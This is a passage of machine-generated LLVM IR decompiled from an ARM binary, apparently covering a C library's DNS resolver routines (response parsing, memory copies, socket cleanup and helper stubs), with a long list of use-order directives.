  br i1 %v1_1b778, label %dec_label_pc_1b848, label %dec_label_pc_1b780

dec_label_pc_1b780:                               ; preds = %dec_label_pc_1b75c
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_1b788 = add i32 %v5_1b774, 10
  store i32 %v1_1b788, i32* @sb, align 4
  %v2_1b78c = sub i32 %v5_1b5ec, %stack_var_-460.364
  %v2_1b790 = sub i32 %v2_1b78c, %v1_1b788
  store i32 %v2_1b790, i32* %r3.global-to-local, align 4
  %v3_1b790 = icmp uge i32 %v2_1b78c, %v1_1b788
  store i1 %v3_1b790, i1* %cpsr_c.global-to-local, align 1
  %v8_1b790 = icmp slt i32 %v2_1b790, 0
  br i1 %v8_1b790, label %dec_label_pc_1b840.thread, label %dec_label_pc_1b7a0

dec_label_pc_1b840.thread:                        ; preds = %dec_label_pc_1b780
  store i32 %v2_1b790, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1b848

dec_label_pc_1b7a0:                               ; preds = %dec_label_pc_1b780
  %v2_1b7a4 = call i32 @__GI_strdup(i8* %v1_1b7a4)
  %v0_1b7ac = load i32, i32* @r4, align 4
  %v2_1b7ac = add i32 %v0_1b7ac, %stack_var_-460.364
  %v0_1b7b0 = load i32, i32* @sl, align 4
  %v2_1b7b0 = add i32 %v0_1b7b0, %v2_1b7ac
  store i32 %v2_1b7b0, i32* %r1.global-to-local, align 4
  %v1_1b7b4 = add i32 %v2_1b7b0, 2
  store i32 %v1_1b7b4, i32* %ip.global-to-local, align 4
  %v1_1b7b8 = add i32 %v2_1b7b0, 4
  store i32 %v1_1b7b8, i32* %r3.global-to-local, align 4
  %v1_1b7bc = add i32 %v2_1b7b0, 5
  %v2_1b7bc = inttoptr i32 %v1_1b7bc to i8*
  %v3_1b7bc = load i8, i8* %v2_1b7bc, align 1
  %v4_1b7bc = zext i8 %v3_1b7bc to i32
  %v1_1b7c4 = add i32 %v2_1b7b0, 8
  %v2_1b7c4 = inttoptr i32 %v1_1b7c4 to i8*
  %v3_1b7c4 = load i8, i8* %v2_1b7c4, align 1
  %v4_1b7c4 = zext i8 %v3_1b7c4 to i32
  %v1_1b7d0 = add i32 %v2_1b7b0, 6
  %v2_1b7d0 = inttoptr i32 %v1_1b7d0 to i8*
  %v3_1b7d0 = load i8, i8* %v2_1b7d0, align 1
  %v4_1b7d0 = zext i8 %v3_1b7d0 to i32
  store i32 %v4_1b7d0, i32* %r3.global-to-local, align 4
  %v1_1b7d4 = add i32 %v2_1b7b0, 9
  %v2_1b7d4 = inttoptr i32 %v1_1b7d4 to i8*
  %v3_1b7d4 = load i8, i8* %v2_1b7d4, align 1
  %v4_1b7d4 = zext i8 %v3_1b7d4 to i32
  %v3_1b7dc = inttoptr i32 %v2_1b7b0 to i8*
  %v4_1b7dc = load i8, i8* %v3_1b7dc, align 1
  %v6_1b7dc = zext i8 %v4_1b7dc to i32
  %v1_1b7e0 = add i32 %v2_1b7b0, 3
  %v2_1b7e0 = inttoptr i32 %v1_1b7e0 to i8*
  %v3_1b7e0 = load i8, i8* %v2_1b7e0, align 1
  %v4_1b7e0 = zext i8 %v3_1b7e0 to i32
  store i32 %v4_1b7e0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_1b7e8 = inttoptr i32 %v1_1b7b4 to i8*
  %v3_1b7e8 = load i8, i8* %v2_1b7e8, align 1
  %v4_1b7e8 = zext i8 %v3_1b7e8 to i32
  store i32 %v4_1b7e8, i32* %ip.global-to-local, align 4
  %v1_1b7ec = add i32 %v2_1b7b0, 1
  %v2_1b7ec = inttoptr i32 %v1_1b7ec to i8*
  %v3_1b7ec = load i8, i8* %v2_1b7ec, align 1
  %v4_1b7ec = zext i8 %v3_1b7ec to i32
  %v4_1b7f0 = mul nuw nsw i32 %v4_1b7c4, 256
  %v5_1b7f0 = or i32 %v4_1b7d4, %v4_1b7f0
  store i32 %v5_1b7f0, i32* @r6, align 4
  store i32 %v4_1b7bc, i32* @r7, align 4
  %v4_1b7f8 = mul nuw nsw i32 %v6_1b7dc, 256
  %v5_1b7f8 = or i32 %v4_1b7ec, %v4_1b7f8
  store i32 %v5_1b7f8, i32* @lr, align 4
  %v4_1b7fc = mul nuw nsw i32 %v4_1b7e8, 256
  %v5_1b7fc = or i32 %v4_1b7fc, %v4_1b7e0
  store i32 %v5_1b7fc, i32* %r3.global-to-local, align 4
  store i32 %v2_1b790, i32* @r5, align 4
  store i32 %v4_1b7d0, i32* @ip, align 4
  %v1_1b810 = add i32 %v2_1b7b0, 10
  store i32 %v1_1b810, i32* %r1.global-to-local, align 4
  %v1_1b814 = add i32 %v2_1b7ac, 10
  store i32 %v1_1b814, i32* @r4, align 4
  %v2_1b818 = sub i32 %v2_1b790, %v5_1b7f0
  %v3_1b818 = icmp uge i32 %v2_1b790, %v5_1b7f0
  store i1 %v3_1b818, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_1b818
  %v6_1b818 = and i32 %v2_1b790, %tmp226
  %v7_1b818 = icmp slt i32 %v6_1b818, 0
  %v8_1b818 = icmp slt i32 %v2_1b818, 0
  store i32 %v2_1b7a4, i32* %stack_var_-144, align 4
  %v2_1b838 = xor i1 %v8_1b818, %v7_1b818
  br i1 %v2_1b838, label %dec_label_pc_1b848, label %dec_label_pc_1b840

dec_label_pc_1b840:                               ; preds = %dec_label_pc_1b7a0
  %v0_1b83c = load i32, i32* @sb, align 4
  %v2_1b83c = add i32 %v0_1b83c, %v5_1b7f0
  store i32 %v2_1b83c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b840 = icmp slt i32 %v2_1b83c, 0
  br i1 %v1_1b840, label %dec_label_pc_1b848, label %dec_label_pc_1b864

dec_label_pc_1b848:                               ; preds = %dec_label_pc_1b840, %dec_label_pc_1b7a0, %dec_label_pc_1b75c, %dec_label_pc_1b840.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b84c = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_1b84c, label %dec_label_pc_1b9b4, label %dec_label_pc_1b854

dec_label_pc_1b854:                               ; preds = %dec_label_pc_1b848
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1b858, label %dec_label_pc_1b9b4, label %dec_label_pc_1b98c

dec_label_pc_1b864:                               ; preds = %dec_label_pc_1b840
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b868 = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_1b868, label %dec_label_pc_1b90c, label %dec_label_pc_1b870

dec_label_pc_1b870:                               ; preds = %dec_label_pc_1b864
  %v0_1b870 = load i32, i32* @fp, align 4
  %v1_1b870 = add i32 %v0_1b870, 28
  store i32 %v1_1b870, i32* %r3.global-to-local, align 4
  %v1_1b874 = inttoptr i32 %v1_1b870 to i32*
  %v2_1b874 = load i32, i32* %v1_1b874, align 4
  store i32 %v2_1b874, i32* @r3, align 4
  %v3_1b874 = add i32 %v0_1b870, 32
  %v4_1b874 = inttoptr i32 %v3_1b874 to i32*
  %v5_1b874 = load i32, i32* %v4_1b874, align 4
  store i32 %v5_1b874, i32* @ip, align 4
  %v6_1b874 = add i32 %v0_1b870, 36
  %v7_1b874 = inttoptr i32 %v6_1b874 to i32*
  %v8_1b874 = load i32, i32* %v7_1b874, align 4
  store i32 %v8_1b874, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_1b870, i32* @r0, align 4
  store i32 %v2_1b744, i32* @r1, align 4
  %v0_1b890 = call i32 @memcpy()
  %v0_1b894 = load i32, i32* @fp, align 4
  %v1_1b894 = add i32 %v0_1b894, 4
  %v2_1b894 = inttoptr i32 %v1_1b894 to i32*
  %v3_1b894 = load i32, i32* %v2_1b894, align 4
  %v2_1b898 = icmp ugt i32 %v3_1b894, 23
  store i1 %v2_1b898, i1* %cpsr_c.global-to-local, align 1
  %v7_1b898 = icmp eq i32 %v3_1b894, 24
  br i1 %v7_1b898, label %dec_label_pc_1b8bc, label %dec_label_pc_1b8a0

dec_label_pc_1b8a0:                               ; preds = %dec_label_pc_1b870
  %v1_1b8a0 = add i32 %v0_1b894, 28
  %v2_1b8a0 = inttoptr i32 %v1_1b8a0 to i32*
  %v3_1b8a0 = load i32, i32* %v2_1b8a0, align 4
  store i32 %v3_1b8a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b8a4 = icmp eq i32 %v3_1b8a0, 0
  br i1 %v2_1b8a4, label %dec_label_pc_1b98c, label %dec_label_pc_1b8ac

dec_label_pc_1b8ac:                               ; preds = %dec_label_pc_1b8a0
  store i1 %v2_1b8b0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1b8b0, label %dec_label_pc_1b8bc, label %bb227

bb227:                                            ; preds = %dec_label_pc_1b8ac
  store i1 %v3_1b8b4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_1b8b4, label %dec_label_pc_1b8bc, label %dec_label_pc_1b98c

dec_label_pc_1b8bc:                               ; preds = %dec_label_pc_1b8ac, %bb227, %dec_label_pc_1b870
  store i32 %v0_1b294, i32* %r1.global-to-local, align 4
  %v3_1b8c0 = icmp uge i32 %v3_1b894, %v0_1b294
  store i1 %v3_1b8c0, i1* %cpsr_c.global-to-local, align 1
  %v9_1b8c0 = icmp eq i32 %v3_1b894, %v0_1b294
  br i1 %v9_1b8c0, label %dec_label_pc_1b8d0, label %bb228

bb228:                                            ; preds = %dec_label_pc_1b8bc
  br label %dec_label_pc_1b964

dec_label_pc_1b8d0:                               ; preds = %dec_label_pc_1b8bc
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_1b8d8 = add i32 %v0_1b894, 16
  %v2_1b8d8 = inttoptr i32 %v1_1b8d8 to i32*
  %v3_1b8d8 = load i32, i32* %v2_1b8d8, align 4
  %v2_1b8dc = sub i32 %tmp159, %stack_var_-452.061
  %v1_1b8e0 = add i32 %v2_1b8dc, -1
  store i32 %v1_1b8e0, i32* %r3.global-to-local, align 4
  %v1_1b8e4 = add i32 %v3_1b8d8, 4
  %v2_1b8e8 = mul i32 %v1_1b8e4, %v1_1b8e0
  store i32 %v2_1b8e8, i32* %r1.global-to-local, align 4
  %v1_1b8ec = add i32 %v0_1b894, 32
  %v2_1b8ec = inttoptr i32 %v1_1b8ec to i32*
  %v3_1b8ec = load i32, i32* %v2_1b8ec, align 4
  %v3_1b8f0 = icmp uge i32 %v2_1b8e8, %v3_1b8ec
  store i1 %v3_1b8f0, i1* %cpsr_c.global-to-local, align 1
  %v2_1b8f4 = add i32 %v0_1b894, 36
  %v3_1b8f4 = inttoptr i32 %v2_1b8f4 to i32*
  store i32 %v1_1b8e0, i32* %v3_1b8f4, align 4
  %tmp286 = icmp ugt i32 %v2_1b8e8, %v3_1b8ec
  br i1 %tmp286, label %dec_label_pc_1b98c, label %dec_label_pc_1b8fc

dec_label_pc_1b8fc:                               ; preds = %dec_label_pc_1b8d0
  store i32 0, i32* @r7, align 4
  %v1_1b904 = load i32, i32* @fp, align 4
  %v2_1b904 = add i32 %v1_1b904, 36
  %v3_1b904 = inttoptr i32 %v2_1b904 to i32*
  store i32 0, i32* %v3_1b904, align 4
  br label %dec_label_pc_1b964

dec_label_pc_1b90c:                               ; preds = %dec_label_pc_1b864
  store i32 %v2_1b7a4, i32* @r0, align 4
  %v0_1b910 = call i32 @free()
  store i32 %v5_1b7f8, i32* %r3.global-to-local, align 4
  store i32 %v0_1b294, i32* @ip, align 4
  %v3_1b91c = icmp uge i32 %v5_1b7f8, %v0_1b294
  store i1 %v3_1b91c, i1* %cpsr_c.global-to-local, align 1
  %v9_1b91c = icmp eq i32 %v5_1b7f8, %v0_1b294
  br i1 %v9_1b91c, label %dec_label_pc_1b924, label %dec_label_pc_1b964

dec_label_pc_1b924:                               ; preds = %dec_label_pc_1b90c
  %v0_1b924 = load i32, i32* @fp, align 4
  %v1_1b924 = add i32 %v0_1b924, 16
  %v2_1b924 = inttoptr i32 %v1_1b924 to i32*
  %v3_1b924 = load i32, i32* %v2_1b924, align 4
  store i32 %v3_1b924, i32* %r1.global-to-local, align 4
  store i32 %v5_1b7f0, i32* %r3.global-to-local, align 4
  %v3_1b92c = icmp uge i32 %v3_1b924, %v5_1b7f0
  store i1 %v3_1b92c, i1* %cpsr_c.global-to-local, align 1
  %v9_1b92c = icmp eq i32 %v3_1b924, %v5_1b7f0
  br i1 %v9_1b92c, label %dec_label_pc_1b940, label %dec_label_pc_1b934

dec_label_pc_1b934:                               ; preds = %dec_label_pc_1b924
  %v1_1b934 = inttoptr i32 %v0_1b924 to i32*
  %v2_1b934 = load i32, i32* %v1_1b934, align 4
  store i32 %v2_1b934, i32* @r0, align 4
  %v0_1b938 = call i32 @free()
  br label %dec_label_pc_1b9b4

dec_label_pc_1b940:                               ; preds = %dec_label_pc_1b924
  %v1_1b940 = add i32 %v0_1b924, 36
  %v2_1b940 = inttoptr i32 %v1_1b940 to i32*
  %v3_1b940 = load i32, i32* %v2_1b940, align 4
  %v1_1b944 = add i32 %v0_1b924, 28
  %v2_1b944 = inttoptr i32 %v1_1b944 to i32*
  %v3_1b944 = load i32, i32* %v2_1b944, align 4
  store i32 %v3_1b944, i32* @r3, align 4
  %v3_1b948 = mul i32 %v3_1b940, %v5_1b7f0
  %v4_1b948 = add i32 %v3_1b944, %v3_1b948
  store i32 %v4_1b948, i32* @r0, align 4
  store i32 %v5_1b7f0, i32* @r2, align 4
  store i32 %v1_1b810, i32* @r1, align 4
  %v0_1b954 = call i32 @memcpy()
  %v0_1b958 = load i32, i32* @fp, align 4
  %v1_1b958 = add i32 %v0_1b958, 36
  %v2_1b958 = inttoptr i32 %v1_1b958 to i32*
  %v3_1b958 = load i32, i32* %v2_1b958, align 4
  %v1_1b95c = add i32 %v3_1b958, 1
  store i32 %v1_1b95c, i32* %r3.global-to-local, align 4
  store i32 %v1_1b95c, i32* %v2_1b958, align 4
  br label %dec_label_pc_1b964

dec_label_pc_1b964:                               ; preds = %bb228, %dec_label_pc_1b90c, %dec_label_pc_1b8fc, %dec_label_pc_1b940
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_1b940 ], [ 0, %dec_label_pc_1b90c ], [ 0, %dec_label_pc_1b8fc ], [ 1, %bb228 ]
  %v1_1b96c = load i32, i32* @r4, align 4
  %v1_1b970 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_1b970, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_1b984 = icmp uge i32 %v1_1b970, %tmp159
  store i1 %v3_1b984, i1* %cpsr_c.global-to-local, align 1
  %v5_1b988 = icmp slt i32 %v1_1b970, %tmp159
  br i1 %v5_1b988, label %dec_label_pc_1b964.dec_label_pc_1b75c_crit_edge, label %dec_label_pc_1b98c

dec_label_pc_1b964.dec_label_pc_1b75c_crit_edge:  ; preds = %dec_label_pc_1b964
  %v2_1b96c = add i32 %v1_1b96c, %stack_var_-460.364
  %v0_1b760.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1b75c

dec_label_pc_1b98c:                               ; preds = %dec_label_pc_1b854, %dec_label_pc_1b738, %dec_label_pc_1b964, %dec_label_pc_1b8a0, %dec_label_pc_1b8d0, %bb227
  %v1_1b990 = call i32 @__GI_close(i32 %v3_1b564)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b998 = icmp eq i32 %arg3, 0
  br i1 %v2_1b998, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_1b98c
  %v1_1b9a0 = load i32, i32* @sl, align 4
  %v3_1b99c = inttoptr i32 %arg3 to i32*
  store i32 %v1_1b9a0, i32* %v3_1b99c, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_1b98c
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_1b9a8.1353 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1b998, i32 ptrtoint (i32* @global_var_15e54.996 to i32))
  store i32 %v1_1b2dc, i32* @r0, align 4
  %v0_1b9ac = call i32 @free()
  br label %dec_label_pc_1ba1c

dec_label_pc_1b9b4:                               ; preds = %thread-pre-split, %dec_label_pc_1b5b0, %dec_label_pc_1b710, %dec_label_pc_1b708, %dec_label_pc_1b6b8, %dec_label_pc_1b6c4, %dec_label_pc_1b6d0thread-pre-split, %thread-pre-split.thread, %dec_label_pc_1b688, %dec_label_pc_1b854, %dec_label_pc_1b848, %dec_label_pc_1b574, %dec_label_pc_1b554, %dec_label_pc_1b934
  %v1_1b9b8 = add i32 %v0_1b478, 1
  store i32 %v1_1b9b8, i32* @r5, align 4
  br label %dec_label_pc_1b9c4

dec_label_pc_1b9c4:                               ; preds = %.thread7, %dec_label_pc_1b9b4
  %storemerge22 = phi i32 [ -1, %dec_label_pc_1b9b4 ], [ %v7_1b674, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_1b9b8, %dec_label_pc_1b9b4 ], [ %v0_1b478, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_1b9c8 = add i32 %stack_var_-476.1, -1
  store i32 %v1_1b9c8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_1b9c8, 1
  br i1 %tmp232, label %dec_label_pc_1b9e4, label %dec_label_pc_1b37c

dec_label_pc_1b9dc:                               ; preds = %dec_label_pc_1b528, %bb218, %bb213, %.thread5, %dec_label_pc_1b2f8
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_1b9e4

dec_label_pc_1b9e4:                               ; preds = %dec_label_pc_1b9c4, %.thread132, %dec_label_pc_1b9dc
  %stack_var_-472.1 = phi i32 [ %v1_1b2dc, %dec_label_pc_1b9dc ], [ 0, %.thread132 ], [ %v1_1b2dc, %dec_label_pc_1b9c4 ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_1b9dc ], [ -1, %.thread132 ], [ %v3_1b564, %dec_label_pc_1b9c4 ]
  %v0_1b9e4 = call i32 @__GI___h_errno_location()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1b9f0 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_1b9f0, i1* %cpsr_c.global-to-local, align 1
  %v7_1b9f0 = icmp eq i32 %stack_var_-488.2, -1
  %v2_1b9f4 = inttoptr i32 %v0_1b9e4 to i32*
  store i32 -1, i32* %v2_1b9f4, align 4
  br i1 %v7_1b9f0, label %dec_label_pc_1ba04, label %dec_label_pc_1b9fc

dec_label_pc_1b9fc:                               ; preds = %dec_label_pc_1b9e4, %dec_label_pc_1b6b0
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1b9e4 ], [ %v1_1b2dc, %dec_label_pc_1b6b0 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_1b9e4 ], [ %v3_1b564, %dec_label_pc_1b6b0 ]
  %v1_1ba00 = call i32 @__GI_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_1ba04

dec_label_pc_1ba04:                               ; preds = %dec_label_pc_1b9e4, %dec_label_pc_1b9fc
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1b9e4 ], [ %stack_var_-472.2, %dec_label_pc_1b9fc ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_1ba08 = call i32 @free()
  %v0_1ba0c = load i32, i32* @sl, align 4
  store i32 %v0_1ba0c, i32* @r0, align 4
  %v0_1ba10 = call i32 @free()
  br label %dec_label_pc_1ba1c

dec_label_pc_1ba1c:                               ; preds = %bb231, %dec_label_pc_1ba04
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_1ba04 ], [ %v5_1b5ec, %bb231 ]
  store i32 %v3_1b280, i32* @r4, align 4
  store i32 %v6_1b280, i32* @r5, align 4
  store i32 %v9_1b280, i32* @r6, align 4
  store i32 %v12_1b280, i32* @r7, align 4
  store i32 %v15_1b280, i32* @r8, align 4
  store i32 %v18_1b280, i32* @sb, align 4
  store i32 %v21_1b280, i32* @sl, align 4
  store i32 %v24_1b280, i32* @fp, align 4
  store i32 %v27_1b280, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_1b9c8, { 1, 2, 0 }
  uselistorder i32 %v1_1b970, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1b924, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1b8e0, { 1, 0, 2 }
  uselistorder i32 %v2_1b818, { 1, 0 }
  uselistorder i32 %v5_1b7f0, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_1b7b0, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_1b7ac, { 1, 0 }
  uselistorder i32 %v2_1b790, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_1b78c, { 1, 0 }
  uselistorder i32 %v1_1b788, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_1b708, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_1b6e4, { 1, 0 }
  uselistorder i32 %v3_1b6d8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1b6d8, { 0, 2, 1 }
  uselistorder i32 %v2_1b6c8, { 0, 2, 1 }
  uselistorder i1 %v7_1b5fc, { 1, 0 }
  uselistorder i32 %v1_1b5fc, { 1, 0 }
  uselistorder i32 %v0_1b5fc, { 1, 0 }
  uselistorder i32 %v5_1b5ec, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_1b564, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_1b51c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1b4a8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1b490, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_1b484, { 1, 0 }
  uselistorder i32 %v0_1b478, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v0_1b430, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v7_1b380, { 1, 0 }
  uselistorder i32 %v1_1b384, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_1b740, { 1, 0, 2 }
  uselistorder i32 %v1_1b650, { 2, 0, 1 }
  uselistorder i32 %v2_1b4d8, { 1, 0, 2 }
  uselistorder i32 %v2_1b4b0, { 1, 0 }
  uselistorder i32 %v0_1b2f8, { 1, 0, 2 }
  uselistorder i32 %v1_1b2dc, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v3_1b2a8, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_1b294, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 19, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 20, 21, 1, 54, 22, 23, 24, 25, 26, 27, 28, 48, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 28, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 3, 24, 25, 26, 27, 28, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 (i32)* @__GI_close, { 15, 14, 16, 24, 23, 22, 21, 20, 19, 18, 17, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 23, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 -3, { 2, 0, 1, 3, 4 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__GI___h_errno_location, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 64, { 1, 16, 0, 13, 9, 11, 4, 5, 6, 7, 14, 15, 10, 8, 2, 3, 12, 18, 17 }
  uselistorder i32 1000, { 5, 3, 6, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 5, 4, 3, 6, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 10, 0 }
  uselistorder i32 17, { 1, 10, 2, 12, 3, 13, 4, 14, 5, 15, 0, 18, 11, 6, 7, 8, 16, 9, 17, 19 }
  uselistorder i32 80, { 0, 3, 14, 15, 16, 4, 5, 6, 7, 1, 8, 9, 17, 18, 19, 10, 12, 11, 20, 13, 2, 21 }
  uselistorder i32 27, { 2, 1, 0, 3 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 26524, { 2, 0, 1, 3 }
  uselistorder i32 512, { 3, 9, 2, 10, 1, 5, 6, 7, 8, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1ba1c, { 1, 0 }
  uselistorder label %dec_label_pc_1ba04, { 1, 0 }
  uselistorder label %dec_label_pc_1b9e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b9dc, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1b9c4, { 1, 0 }
  uselistorder label %dec_label_pc_1b9b4, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_1b98c, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_1b964, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1b8bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b848, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1b75c, { 1, 0 }
  uselistorder label %dec_label_pc_1b708, { 1, 0 }
  uselistorder label %dec_label_pc_1b6d8, { 1, 0 }
  uselistorder label %dec_label_pc_1b6b0, { 1, 0 }
  uselistorder label %dec_label_pc_1b5fc, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_1b458, { 1, 0 }
  uselistorder label %dec_label_pc_1b41c, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @"$d"(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1ba2c:
  %v0_1ba2c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ba2c, label %.thread5, label %.thread13

.thread5:                                         ; preds = %dec_label_pc_1ba2c
  call void @llvm.trap()
  unreachable

.thread13:                                        ; preds = %dec_label_pc_1ba2c
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 744, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1bac0 = load i32, i32* @r4, align 4
  store i32 %v3_1bac0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @ip, align 4
  store i32 744, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1bad0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1bad09 = inttoptr i32 %v0_1bad0.pre to i8*
  %v2_1bad010 = load i8, i8* %v1_1bad09, align 1
